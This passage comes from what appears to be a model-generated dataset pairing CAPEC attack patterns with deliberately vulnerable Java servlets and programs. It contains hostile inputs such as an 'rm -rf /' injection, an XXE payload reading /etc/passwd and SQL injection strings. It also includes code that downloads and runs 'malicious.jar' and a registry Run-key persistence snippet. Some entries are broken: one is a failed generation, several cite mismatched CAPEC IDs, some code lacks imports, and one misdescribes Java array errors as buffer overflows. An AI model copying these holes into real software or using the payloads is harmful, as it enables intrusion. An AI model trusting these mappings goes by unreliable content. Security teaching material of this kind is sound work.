        "code_snippet": "import javax.servlet.http.*;\nimport java.io.IOException;\n\npublic class VulnerableServlet extends HttpServlet {\n    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws IOException {\n        String userInput = request.getParameter(\"input\");\n        String sanitizedInput = userInput.replaceAll(\"<script>\", \"\"); // Incomplete denylist\n        response.setContentType(\"text/html\");\n        response.getWriter().println(\"<img src='\" + sanitizedInput + \"'>\"); // Improper neutralization in IMG tag\n    }\n}",
        "description": "This Java servlet code demonstrates a vulnerability related to the deprecated CAPEC for XSS using Flash, now covered by CAPEC-174 and CAPEC-591. The code takes user input from an HTTP GET request and attempts to sanitize it using an incomplete denylist (CWE-692). The sanitized input is then directly inserted into an IMG tag's src attribute without proper neutralization (CWE-82), making it susceptible to XSS attacks. This example highlights the risks of using incomplete denylist-based sanitization and improper handling of user input in HTML attributes."
    },
    {
        "capec_id": "247",
        "capec_name": "XSS Using Invalid Characters",
        "code_snippet": "import javax.servlet.http.*;\nimport java.io.IOException;\n\npublic class VulnerableServlet extends HttpServlet {\n    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws IOException {\n        String userInput = request.getParameter(\"input\");\n        // Improper neutralization of invalid characters\n        if (userInput != null && userInput.contains(\"\\0\")) {\n            userInput = userInput.split(\"\\0\")[0];\n        }\n        // Improper neutralization of script-related HTML tags\n        response.getWriter().println(\"<html><body>\" + userInput + \"</body></html>\");\n    }\n}",
        "description": "This Java servlet code demonstrates a vulnerability where user input is improperly sanitized, allowing for XSS attacks. The code attempts to filter out null characters (\\0) but only removes the part of the input after the null character, potentially leaving malicious content before it. Additionally, the code directly includes user input in the HTML response without properly neutralizing special characters like '<' and '>', making it susceptible to XSS attacks. This snippet embodies the main idea of CAPEC-86 by showing how invalid characters can be used to bypass input filtering, leading to XSS vulnerabilities."
    },
    {
        "capec_id": "248",
        "capec_name": "Command Injection",
        "code_snippet": "import java.io.BufferedReader;\nimport java.io.InputStreamReader;\n\npublic class CommandInjectionExample {\n    public static void main(String[] args) {\n        if (args.length != 1) {\n            System.out.println(\"Usage: java CommandInjectionExample <command>\");\n            return;\n        }\n\n        String userInput = args[0];\n        try {\n            // Vulnerable code: directly using user input in a command\n            String command = \"ls \" + userInput;\n            Process process = Runtime.getRuntime().exec(command);\n            BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));\n            String line;\n            while ((line = reader.readLine()) != null) {\n                System.out.println(line);\n            }\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a command injection vulnerability. The program takes a single command-line argument from the user and directly incorporates it into an OS command string without proper validation or neutralization. Specifically, the user input is concatenated with the 'ls' command, which lists directory contents. An attacker can exploit this by providing malicious input, such as '; rm -rf /', to execute arbitrary commands. This example embodies the main idea of CAPEC-88 (Command Injection) and related CWEs, highlighting the risks of improper input handling and command construction."
    },
    {
        "capec_id": "249",
        "capec_name": "DEPRECATED: Linux Terminal Injection",
        "code_snippet": "import java.io.BufferedReader;\nimport java.io.InputStreamReader;\nimport java.io.IOException;\n\npublic class TerminalInjectionExample {\n    public static void main(String[] args) {\n        try {\n            BufferedReader reader = new BufferedReader(new InputStreamReader(System.in));\n            System.out.print(\"Enter a command: \");\n            String userInput = reader.readLine();\n\n            // Vulnerable code: directly using user input in a command\n            String command = \"/bin/sh -c \" + userInput;\n            Process process = Runtime.getRuntime().exec(command);\n\n            BufferedReader processReader = new BufferedReader(new InputStreamReader(process.getInputStream()));\n            String line;\n            while ((line = processReader.readLine()) != null) {\n                System.out.println(line);\n            }\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerability related to 'Improper Neutralization of Special Elements used in a Command' (CWE-77) and 'Improper Neutralization of Special Elements used in an OS Command' (CWE-78). The code reads a command from user input and directly executes it using the Runtime.getRuntime().exec() method. This can lead to command injection, where an attacker can input malicious commands to be executed by the system. The main idea represented here is the risk of executing user-supplied input without proper validation or sanitization, which can be exploited to perform unauthorized actions on the system."
    },
    {
        "capec_id": "250",
        "capec_name": "XML Injection",
        "code_snippet": "User intervention needed!",
        "description": "The model failed to generate a description for this code snippet. Error: Could not parse response content as the length limit was reached"
    },
    {
        "capec_id": "251",
        "capec_name": "Local Code Inclusion",
        "code_snippet": "import java.io.*;\nimport java.util.*;\n\npublic class LocalCodeInclusion {\n    private static final String BASE_PATH = \"/usr/local/app/libs/\";\n    private static Map<String, String> trustedLibraries = new HashMap<>();\n\n    static {\n        // Trusted libraries\n        trustedLibraries.put(\"lib1\", \"lib1_v1.0.jar\");\n        trustedLibraries.put(\"lib2\", \"lib2_v2.0.jar\");\n    }\n\n    public static void main(String[] args) {\n        if (args.length != 1) {\n            System.out.println(\"Usage: java LocalCodeInclusion <library>\");\n            return;\n        }\n\n        String library = args[0];\n        try {\n            loadLibrary(library);\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n\n    public static void loadLibrary(String library) throws Exception {\n        String libraryPath = BASE_PATH + library;\n        File libFile = new File(libraryPath);\n\n        if (!libFile.exists()) {\n            throw new FileNotFoundException(\"Library not found: \" + libraryPath);\n        }\n\n        // Simulate loading the library\n        System.out.println(\"Loading library: \" + libraryPath);\n        // In a real scenario, this could be a dynamic class loader\n    }\n}",
        "description": "This Java code snippet demonstrates a basic example of Local Code Inclusion vulnerability. The program attempts to load a library file from a specified directory based on user input. The `loadLibrary` method constructs the file path using a base directory and the user-provided library name. If the file exists, it simulates loading the library. This approach is vulnerable because it allows an attacker to specify any file within the base directory, potentially loading malicious or outdated libraries. The code also highlights CWE-829 (Inclusion of Functionality from Untrusted Control Sphere) by allowing user input to control which library is loaded, CWE-913 (Improper Control of Dynamically-Managed Code Resources) by not properly validating the library path, and CWE-1108 (Excessive Reliance on Global Variables) by using a global map for trusted libraries."
    },
    {
        "capec_id": "252",
        "capec_name": "PHP Local File Inclusion",
        "code_snippet": "import java.io.*;\nimport javax.servlet.*;\nimport javax.servlet.http.*;\n\npublic class LocalFileInclusionServlet extends HttpServlet {\n    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {\n        String filePath = request.getParameter(\"file\");\n        if (filePath != null) {\n            File file = new File(filePath);\n            if (file.exists() && file.isFile()) {\n                BufferedReader reader = new BufferedReader(new FileReader(file));\n                String line;\n                while ((line = reader.readLine()) != null) {\n                    response.getWriter().println(line);\n                }\n                reader.close();\n            } else {\n                response.getWriter().println(\"File not found or is not a file.\");\n            }\n        } else {\n            response.getWriter().println(\"No file specified.\");\n        }\n    }\n}",
        "description": "This Java servlet code demonstrates a local file inclusion vulnerability. The servlet reads a file path from a request parameter and attempts to read and output the contents of the specified file. This code is vulnerable because it does not properly validate or sanitize the input file path, allowing an attacker to specify any file on the server's filesystem. This can lead to the inclusion and execution of arbitrary files, potentially exposing sensitive information or enabling further attacks. The code embodies the main idea of CAPEC-152 (PHP Local File Inclusion) and is related to CWE-829, CWE-98, CWE-646, CWE-616, and CWE-473, as it improperly handles external input and relies on file names without adequate validation."
    },
    {
        "capec_id": "253",
        "capec_name": "Remote Code Inclusion",
        "code_snippet": "import java.io.*;\nimport java.net.*;\n\npublic class RemoteCodeInclusion {\n    public static void main(String[] args) {\n        try {\n            // CWE-494: Download of Code Without Integrity Check\n            URL url = new URL(\"http://example.com/malicious.jar\");\n            URLConnection connection = url.openConnection();\n            InputStream inputStream = connection.getInputStream();\n            FileOutputStream outputStream = new FileOutputStream(\"malicious.jar\");\n            byte[] buffer = new byte[1024];\n            int bytesRead;\n            while ((bytesRead = inputStream.read(buffer)) != -1) {\n                outputStream.write(buffer, 0, bytesRead);\n            }\n            inputStream.close();\n            outputStream.close();\n\n            // CWE-829: Inclusion of Functionality from Untrusted Control Sphere\n            ProcessBuilder pb = new ProcessBuilder(\"java\", \"-jar\", \"malicious.jar\");\n            Process process = pb.start();\n            process.waitFor();\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a Remote Code Inclusion vulnerability. The code downloads a JAR file from a remote URL without performing any integrity checks (CWE-494). After downloading, it executes the JAR file, which could contain malicious code (CWE-829). This represents the main idea of the CAPEC, where an attacker can force an application to load and execute arbitrary code from a remote location, potentially compromising the application's security."
    },
    {
        "capec_id": "254",
        "capec_name": "DEPRECATED: DTD Injection in a SOAP Message",
        "code_snippet": "import javax.xml.parsers.DocumentBuilderFactory;\nimport javax.xml.parsers.DocumentBuilder;\nimport org.w3c.dom.Document;\nimport java.io.StringReader;\nimport javax.xml.XMLConstants;\nimport javax.xml.transform.stream.StreamSource;\nimport javax.xml.validation.SchemaFactory;\n\npublic class DTDInjectionExample {\n    public static void main(String[] args) {\n        String xml = \"<?xml version=\\\"1.0\\\"?>\\n\" +\n                     \"<!DOCTYPE root [<!ENTITY xxe SYSTEM \\\"file:///etc/passwd\\\">]>\\n\" +\n                     \"<root>&xxe;</root>\";\n\n        try {\n            DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();\n            dbf.setFeature(XMLConstants.FEATURE_SECURE_PROCESSING, true);\n            dbf.setFeature(\"http://apache.org/xml/features/disallow-doctype-decl\", false);\n            dbf.setFeature(\"http://xml.org/sax/features/external-general-entities\", true);\n            dbf.setFeature(\"http://xml.org/sax/features/external-parameter-entities\", true);\n\n            DocumentBuilder db = dbf.newDocumentBuilder();\n            Document doc = db.parse(new InputSource(new StringReader(xml)));\n\n            System.out.println(doc.getDocumentElement().getTextContent());\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a DTD Injection vulnerability in a SOAP message. The code parses an XML string that includes a Document Type Definition (DTD) with an external entity reference. The external entity references a local file ('/etc/passwd'), which is a common target for attackers to read sensitive information. The DocumentBuilderFactory is configured to allow external entity references, which is the root cause of the vulnerability (CWE-827). The code does not properly restrict the DTD (CWE-776), leading to potential information exposure (CWE-651). This example highlights the importance of securely configuring XML parsers to prevent DTD injection attacks."
    },
    {
        "capec_id": "256",
        "capec_name": "SOAP Array Overflow",
        "code_snippet": "import javax.xml.soap.*;\n\npublic class SOAPArrayOverflowExample {\n    public static void main(String[] args) throws Exception {\n        // Simulate a SOAP message with an array\n        String soapMessage = \"<soap:Envelope xmlns:soap=\\\"http://schemas.xmlsoap.org/soap/envelope/\\\"><soap:Body><ArrayElement><size>3</size><data>1,2,3,4,5</data></ArrayElement></soap:Body></soap:Envelope>\";\n        SOAPMessage message = MessageFactory.newInstance().createMessage(null, new java.io.ByteArrayInputStream(soapMessage.getBytes()));\n        SOAPBody body = message.getSOAPBody();\n        NodeList sizeNode = body.getElementsByTagName(\"size\");\n        NodeList dataNode = body.getElementsByTagName(\"data\");\n\n        int size = Integer.parseInt(sizeNode.item(0).getTextContent());\n        String[] data = dataNode.item(0).getTextContent().split(\",\");\n\n        // Vulnerable code: trusting the size field without validation\n        int[] array = new int[size];\n        for (int i = 0; i < data.length; i++) {\n            array[i] = Integer.parseInt(data[i]); // Potential buffer overflow\n        }\n\n        // Print the array\n        for (int i : array) {\n            System.out.println(i);\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a SOAP Array Overflow vulnerability. The SOAP message contains an array with a specified size of 3, but the actual data contains 5 elements. The code naively trusts the size field and allocates an array of size 3. It then attempts to populate this array with 5 elements, leading to a potential buffer overflow. This example embodies the main idea of CAPEC-137 (SOAP Array Overflow) and is related to several CWEs, including CWE-805 (Buffer Access with Incorrect Length Value), CWE-130 (Improper Handling of Length Parameter Inconsistency), and CWE-120 (Classic Buffer Overflow)."
    },
    {
        "capec_id": "257",
        "capec_name": "DEPRECATED: Abuse of Transaction Data Structure",
        "code_snippet": "import java.io.FileWriter;\nimport java.io.IOException;\nimport java.util.HashMap;\nimport java.util.Map;\n\npublic class TransactionLogger {\n    private Map<String, String> transactions = new HashMap<>();\n    private static final String LOG_FILE = \"transaction.log\";\n\n    public void addTransaction(String transactionId, String data) {\n        transactions.put(transactionId, data);\n        logTransaction(transactionId, data);\n    }\n\n    private void logTransaction(String transactionId, String data) {\n        try (FileWriter writer = new FileWriter(LOG_FILE, true)) {\n            writer.write(\"Transaction ID: \" + transactionId + \", Data: \" + data + \"\\n\");\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n\n    public static void main(String[] args) {\n        TransactionLogger logger = new TransactionLogger();\n        logger.addTransaction(\"12345\", \"SensitiveData\");\n    }\n}",
        "description": "This Java code snippet represents a deprecated attack pattern related to the abuse of transaction data structures. The code includes a `TransactionLogger` class that stores transaction data in a HashMap and logs each transaction to a file named `transaction.log`. This example embodies several deprecated CWEs: \n\n1. **CWE-217**: The code does not protect the stored transaction data from modification, as it is stored in a simple HashMap without any security measures.\n2. **CWE-218**: The code does not provide confidentiality for the stored data, as the transaction data is logged in plain text.\n3. **CWE-534 and CWE-533**: The code exposes sensitive information through log files, which can be accessed by unauthorized users.\n4. **CWE-592**: The code does not implement any authentication mechanisms to prevent unauthorized access to the transaction logging functionality.\n\nOverall, this code snippet demonstrates how improper handling and logging of transaction data can lead to various security vulnerabilities."
    },
    {
        "capec_id": "258",
        "capec_name": "DEPRECATED: Passively Sniffing and Capturing Application Code Bound for an Authorized Client During Dynamic Update",
        "code_snippet": "import java.io.*;\nimport java.net.*;\n\npublic class VulnerableUpdateClient {\n    public static void main(String[] args) throws IOException {\n        String serverAddress = \"http://example.com/update\";\n        URL url = new URL(serverAddress);\n        HttpURLConnection connection = (HttpURLConnection) url.openConnection();\n        connection.setRequestMethod(\"GET\");\n\n        // Vulnerable: No server-side authentication, relying on client-side only\n        String clientAuthToken = \"client-auth-token\";\n        connection.setRequestProperty(\"Authorization\", clientAuthToken);\n\n        InputStream inputStream = connection.getInputStream();\n        BufferedReader reader = new BufferedReader(new InputStreamReader(inputStream));\n        String line;\n        while ((line = reader.readLine()) != null) {\n            System.out.println(line);\n        }\n        reader.close();\n    }\n}",
        "description": "This Java code snippet represents a vulnerable client application that fetches updates from a server. The main vulnerability lies in the use of client-side authentication (CWE-603), where the client sends an authentication token to the server without any server-side verification. This makes it possible for an attacker to sniff the network traffic (CAPEC-65) and capture the authentication token. The attacker can then replay the captured token (CWE-294) to bypass authentication and gain unauthorized access to the update data. The code demonstrates the lack of proper server-side authentication and the potential for capture-replay attacks."
    },
    {
        "capec_id": "259",
        "capec_name": "DEPRECATED: Passively Sniffing and Capturing Application Code Bound for an Authorized Client During Patching",
        "code_snippet": "import java.io.*;\nimport java.net.*;\n\npublic class VulnerablePatchUpdater {\n    public static void main(String[] args) throws IOException {\n        String serverAddress = \"http://example.com/patch\";\n        URL url = new URL(serverAddress);\n        HttpURLConnection connection = (HttpURLConnection) url.openConnection();\n        connection.setRequestMethod(\"GET\");\n\n        // Vulnerable: No server-side authentication, relying on client-side check\n        if (authenticateClient()) {\n            InputStream inputStream = connection.getInputStream();\n            FileOutputStream outputStream = new FileOutputStream(\"patch.zip\");\n            byte[] buffer = new byte[1024];\n            int bytesRead;\n            while ((bytesRead = inputStream.read(buffer)) != -1) {\n                outputStream.write(buffer, 0, bytesRead);\n            }\n            inputStream.close();\n            outputStream.close();\n        } else {\n            System.out.println(\"Authentication failed.\");\n        }\n    }\n\n    // Vulnerable: Client-side authentication\n    private static boolean authenticateClient() {\n        // Simulate client-side authentication\n        return true; // Always returns true, bypassable\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerable patch updater that downloads a patch from a server. The main vulnerability lies in the use of client-side authentication (CWE-603), which can be easily bypassed by an attacker. The `authenticateClient` method always returns true, allowing any client to download the patch without proper server-side authentication. This setup is susceptible to sniffing and capturing application code during patching (CAPEC-65). An attacker could exploit this by capturing the network traffic and replaying it to download the patch without authorization (CWE-294)."
    },
    {
        "capec_id": "260",
        "capec_name": "DEPRECATED: Passively Sniffing and Capturing Application Code Bound for an Authorized Client During Initial Distribution",
        "code_snippet": "import java.io.*;\nimport java.net.*;\n\npublic class VulnerableServer {\n    public static void main(String[] args) throws IOException {\n        ServerSocket serverSocket = new ServerSocket(8080);\n        System.out.println(\"Server started on port 8080\");\n\n        while (true) {\n            Socket clientSocket = serverSocket.accept();\n            new Thread(new ClientHandler(clientSocket)).start();\n        }\n    }\n}\n\nclass ClientHandler implements Runnable {\n    private Socket clientSocket;\n\n    public ClientHandler(Socket socket) {\n        this.clientSocket = socket;\n    }\n\n    @Override\n    public void run() {\n        try {\n            BufferedReader in = new BufferedReader(new InputStreamReader(clientSocket.getInputStream()));\n            PrintWriter out = new PrintWriter(clientSocket.getOutputStream(), true);\n\n            // Vulnerable: Client-side authentication\n            String clientMessage = in.readLine();\n            if (clientMessage.equals(\"AUTHENTICATE\")) {\n                out.println(\"AUTH_SUCCESS\");\n            } else {\n                out.println(\"AUTH_FAIL\");\n            }\n\n            // Simulate sending application code\n            out.println(\"Here is the application code...\");\n\n            in.close();\n            out.close();\n            clientSocket.close();\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet represents a vulnerable server that performs client-side authentication and sends application code to the client. The server listens on port 8080 and spawns a new thread for each client connection. The `ClientHandler` class handles the client communication. The authentication check is performed on the client side by simply checking if the received message equals 'AUTHENTICATE'. If the check passes, the server sends 'AUTH_SUCCESS' and proceeds to send the application code. This setup is vulnerable to capture-replay attacks (CWE-294) because an attacker can sniff the network traffic, capture the 'AUTHENTICATE' message, and replay it to bypass authentication. Additionally, the use of client-side authentication (CWE-603) allows an attacker to modify the client to bypass the authentication check entirely."
    },
    {
        "capec_id": "261",
        "capec_name": "Fuzzing for garnering other adjacent user/sensitive data",
        "code_snippet": "import java.sql.Connection;\nimport java.sql.DriverManager;\nimport java.sql.ResultSet;\nimport java.sql.SQLException;\nimport java.sql.Statement;\n\npublic class VulnerableFuzzingExample {\n    public static void main(String[] args) {\n        String userInput = \"' OR '1'='1\"; // Malicious input for SQL Injection\n        String query = \"SELECT * FROM users WHERE username = '\" + userInput + \"'\";\n\n        try (Connection connection = DriverManager.getConnection(\"jdbc:mysql://localhost:3306/mydatabase\", \"user\", \"password\");\n             Statement statement = connection.createStatement();\n             ResultSet resultSet = statement.executeQuery(query)) {\n\n            while (resultSet.next()) {\n                System.out.println(\"User: \" + resultSet.getString(\"username\") + \", Password: \" + resultSet.getString(\"password\"));\n            }\n        } catch (SQLException e) {\n            e.printStackTrace(); // Potentially exposes sensitive information\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerable implementation of a SQL query that is susceptible to SQL Injection attacks. The user input is directly concatenated into the SQL query without proper validation or sanitization, allowing an attacker to manipulate the query logic. The code also prints out sensitive information (username and password) if the query is successful. Additionally, the error handling mechanism prints the stack trace, which could expose sensitive information about the database and the environment. This example embodies the main idea of the CAPEC by showing how an adversary can send modified queries to extract sensitive information, leveraging weaknesses such as improper input validation (CWE-20), SQL Injection (CWE-89), and exposure of sensitive information through error messages (CWE-209)."
    },
    {
        "capec_id": "263",
        "capec_name": "Force Use of Corrupted Files",
        "code_snippet": "import java.io.*;\n\npublic class VulnerableFileProcessor {\n    public static void main(String[] args) {\n        if (args.length != 1) {\n            System.out.println(\"Usage: java VulnerableFileProcessor <file_path>\");\n            return;\n        }\n\n        String filePath = args[0];\n        File file = new File(filePath);\n\n        // CWE-646: Reliance on File Name or Extension of Externally-Supplied File\n        if (!file.getName().endsWith(\".txt\")) {\n            System.out.println(\"Invalid file type. Only .txt files are allowed.\");\n            return;\n        }\n\n        try (BufferedReader reader = new BufferedReader(new FileReader(file))) {\n            String line;\n            while ((line = reader.readLine()) != null) {\n                // Process the file line by line\n                System.out.println(line);\n            }\n        } catch (IOException e) {\n            // CWE-829: Inclusion of Functionality from Untrusted Control Sphere\n            // CWE-434: Unrestricted Upload of File with Dangerous Type\n            System.out.println(\"Error reading the file: \" + e.getMessage());\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerable file processing application. The application takes a file path as an argument and attempts to read and process the file if it has a .txt extension. The code embodies the main idea of the CAPEC 'Force Use of Corrupted Files' by showing how an attacker could exploit the reliance on the file extension (CWE-646) to force the application to process a corrupted or dangerous file. Additionally, the code does not properly handle potential errors or validate the file's content, which could lead to further vulnerabilities such as denial of service or execution of malicious code (CWE-829, CWE-434)."
    },
    {
        "capec_id": "264",
        "capec_name": "DEPRECATED: Environment Variable Manipulation",
        "code_snippet": "import java.io.IOException;\n\npublic class VulnerableCode {\n    // CWE-1108: Excessive Reliance on Global Variables\n    public static String ENV_VAR = System.getenv(\"TARGET_ENV\");\n\n    public static void main(String[] args) throws IOException {\n        // CWE-1126: Declaration of Variable with Unnecessarily Wide Scope\n        String command;\n\n        if (ENV_VAR != null) {\n            // CWE-95: Improper Neutralization of Directives in Dynamically Evaluated Code ('Eval Injection')\n            command = \"echo \" + ENV_VAR;\n            Runtime.getRuntime().exec(command); // Potentially dangerous\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerable pattern related to environment variable manipulation (CAPEC-13). The code retrieves an environment variable 'TARGET_ENV' and uses it to construct a command that is executed by the system. This is dangerous because it does not neutralize the input, leading to potential command injection (CWE-95). Additionally, the code relies on a global variable (CWE-1108) and declares a variable with unnecessarily wide scope (CWE-1126), which can lead to maintenance and security issues."
    },
    {
        "capec_id": "265",
        "capec_name": "DEPRECATED: Global variable manipulation",
        "code_snippet": "public class VulnerableApp {\n    // Global variable that can be manipulated\n    public static String userRole = \"guest\";\n\n    public static void main(String[] args) {\n        // Simulate user input\n        String inputRole = args[0];\n        setUserRole(inputRole);\n\n        // Check user role for access control\n        if (userRole.equals(\"admin\")) {\n            System.out.println(\"Access granted to admin functionality.\");\n        } else {\n            System.out.println(\"Access denied.\");\n        }\n    }\n\n    public static void setUserRole(String role) {\n        // Improper control of dynamically-identified variable\n        userRole = role;\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerability related to excessive reliance on global variables and improper control of dynamically-identified variables. The global variable 'userRole' is used to manage user roles and is manipulated based on user input. The 'setUserRole' method directly assigns the user input to the global variable without any validation or restriction, allowing an attacker to escalate privileges by setting the role to 'admin'. This embodies the main idea of the deprecated CAPEC 'Global variable manipulation' and related CWEs, highlighting the risks of using global variables and failing to properly control dynamically-identified variables."
    },
    {
        "capec_id": "266",
        "capec_name": "DEPRECATED: Manipulate Canonicalization",
        "code_snippet": "import java.util.HashMap;\nimport java.util.Map;\n\npublic class VulnerableCode {\n    public static void main(String[] args) {\n        String userInput = \"../../etc/passwd\";\n        String canonicalPath = canonicalize(userInput);\n        if (isValidPath(userInput)) { // Incorrect Behavior Order: Validate Before Canonicalize\n            System.out.println(\"Valid path: \" + canonicalPath);\n        } else {\n            System.out.println(\"Invalid path\");\n        }\n    }\n\n    public static String canonicalize(String path) {\n        // Simulate canonicalization\n        return path.replace(\"..\", \"\");\n    }\n\n    public static boolean isValidPath(String path) {\n        // Simulate path validation\n        return !path.contains(\"..\");\n    }\n\n    public void modifyAttributes(Map<String, String> attributes) {\n        // Improperly Controlled Modification of Dynamically-Determined Object Attributes\n        for (Map.Entry<String, String> entry : attributes.entrySet()) {\n            // Assume all attributes are safe to modify\n            System.out.println(\"Modifying \" + entry.getKey() + \" to \" + entry.getValue());\n        }\n    }\n\n    public void evalInjection(String userInput) {\n        // Improper Neutralization of Directives in Dynamically Evaluated Code ('Eval Injection')\n        try {\n            Runtime.getRuntime().exec(userInput);\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates several vulnerabilities related to the deprecated CAPEC 'Manipulate Canonicalization' and its associated CWEs. The main idea is to show how improper handling of canonicalization and validation can lead to security issues.\n\n1. **Incorrect Behavior Order: Validate Before Canonicalize (CWE-180)**: The code validates the user input before canonicalizing it, which can lead to bypassing validation checks. For example, the input '../../etc/passwd' is validated as safe but becomes dangerous after canonicalization.\n\n2. **Improperly Controlled Modification of Dynamically-Determined Object Attributes (CWE-915)**: The `modifyAttributes` method assumes all attributes are safe to modify without proper checks, which can lead to unauthorized modifications.\n\n3. **Improper Neutralization of Directives in Dynamically Evaluated Code ('Eval Injection') (CWE-95)**: The `evalInjection` method directly executes user input without neutralizing it, leading to potential command injection vulnerabilities."
    },
    {
        "capec_id": "267",
        "capec_name": "Leverage Alternate Encoding",
        "code_snippet": "import java.io.UnsupportedEncodingException;\nimport java.net.URLDecoder;\nimport java.util.regex.Pattern;\n\npublic class VulnerableEncodingExample {\n    public static void main(String[] args) {\n        String userInput = \"%2E%2E%2F%2E%2E%2Fetc%2Fpasswd\"; // Encoded input\n        try {\n            // CWE-180: Validate before canonicalize\n            if (isValidInput(userInput)) {\n                String decodedInput = URLDecoder.decode(userInput, \"UTF-8\");\n                // CWE-73: External control of file name or path\n                readFile(decodedInput);\n            } else {\n                System.out.println(\"Invalid input detected.\");\n            }\n        } catch (UnsupportedEncodingException e) {\n            e.printStackTrace();\n        }\n    }\n\n    private static boolean isValidInput(String input) {\n        // CWE-20: Improper Input Validation\n        // CWE-692: Incomplete Denylist to Cross-Site Scripting\n        String denylistPattern = \"[<>%]\";\n        return !Pattern.compile(denylistPattern).matcher(input).find();\n    }\n\n    private static void readFile(String filePath) {\n        // Simulate file reading\n        System.out.println(\"Reading file: \" + filePath);\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerability where user input is validated before being canonicalized (decoded), which can lead to security issues such as path traversal attacks. The user input is URL-encoded to represent a potentially harmful path. The `isValidInput` method uses a denylist to check for invalid characters, but this validation occurs before the input is decoded. As a result, harmful input can bypass the validation and be decoded into a dangerous path, leading to potential file access vulnerabilities. This example embodies the CAPEC concept of leveraging alternate encoding to bypass security mechanisms, and it highlights related CWEs such as improper input validation, incomplete denylist, and external control of file paths."
    },
    {
        "capec_id": "268",
        "capec_name": "Audit Log Manipulation",
        "code_snippet": "import java.io.FileWriter;\nimport java.io.IOException;\nimport java.util.logging.Level;\nimport java.util.logging.Logger;\n\npublic class VulnerableLogger {\n    private static final Logger logger = Logger.getLogger(VulnerableLogger.class.getName());\n    private static final String LOG_FILE = \"app.log\";\n\n    public static void main(String[] args) {\n        try {\n            logSensitiveData(\"User password: 12345\");\n            logEvent(\"User login successful\");\n            logEvent(\"User login failed\");\n        } catch (IOException e) {\n            logger.log(Level.SEVERE, \"Logging failed\", e);\n        }\n    }\n\n    public static void logSensitiveData(String data) throws IOException {\n        try (FileWriter fw = new FileWriter(LOG_FILE, true)) {\n            fw.write(data + \"\\n\");\n        }\n    }\n\n    public static void logEvent(String event) throws IOException {\n        try (FileWriter fw = new FileWriter(LOG_FILE, true)) {\n            fw.write(event + \"\\n\");\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerable logging mechanism that embodies the main idea of CAPEC-117: Audit Log Manipulation. The code includes several weaknesses related to the CWE entries provided. Specifically, it logs sensitive information (CWE-532) such as user passwords, does not neutralize log output (CWE-117), and lacks proper access controls for the log file (CWE-497). Additionally, it logs both successful and failed login attempts without sufficient detail (CWE-778), and the logging mechanism could potentially log excessive data (CWE-779). This makes the log file susceptible to manipulation, deletion, or forgery by an attacker, thereby misleading audits or covering tracks of an attack."
    },
    {
        "capec_id": "269",
        "capec_name": "DEPRECATED: Registry Manipulation",
        "code_snippet": "import java.util.prefs.Preferences;\n\npublic class RegistryManipulation {\n    public static void main(String[] args) {\n        Preferences prefs = Preferences.userRoot().node(\"/com/example/app\");\n        \n        // CWE-314: Cleartext Storage in the Registry\n        String sensitiveData = \"password123\";\n        prefs.put(\"sensitiveKey\", sensitiveData); // Storing sensitive data in cleartext\n        \n        // CWE-270: Privilege Context Switching Error\n        try {\n            System.setProperty(\"java.security.policy\", \"path/to/policy/file\");\n            System.setSecurityManager(new SecurityManager());\n            // Perform privileged action\n        } catch (SecurityException e) {\n            e.printStackTrace();\n        } finally {\n            System.setSecurityManager(null); // Improperly managing privileges\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerable implementation of registry manipulation, embodying the main idea of CAPEC-203. The code stores sensitive information (a password) in cleartext in the registry (CWE-314), which is a security risk. Additionally, it shows improper management of privileges while switching contexts (CWE-270), by setting a security manager and then removing it without proper handling. This can lead to privilege escalation or other security issues. The code highlights the risks associated with improper registry manipulation and privilege management."
    },
    {
        "capec_id": "270",
        "capec_name": "Modification of Registry Run Keys",
        "code_snippet": "import java.util.prefs.Preferences;\n\npublic class RegistryRunKeyModifier {\n    public static void main(String[] args) {\n        // Obtain the user preferences node for the application\n        Preferences userPrefs = Preferences.userRoot().node(\"com.example.myapp\");\n\n        // Add a new entry to the run key\n        userPrefs.put(\"Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run\\\\MyApp\", \"C:\\\\path\\\\to\\\\malicious\\\\executable.exe\");\n\n        // Store sensitive information in cleartext (CWE-314)\n        userPrefs.put(\"SensitiveInfo\", \"password123\");\n\n        System.out.println(\"Registry run key modified and sensitive information stored.\");\n    }\n}",
        "description": "This Java code snippet demonstrates how an adversary might modify the Windows registry run keys to ensure a malicious executable runs whenever a user logs in. The code uses the Preferences API to add a new entry to the 'Run' key in the Windows registry, pointing to a malicious executable. Additionally, it stores sensitive information in cleartext within the registry, highlighting CWE-314. This snippet embodies the main idea of CAPEC-15 by showing how an attacker can achieve persistence on a target system by modifying registry settings."
    },
    {
        "capec_id": "271",
        "capec_name": "Schema Poisoning",
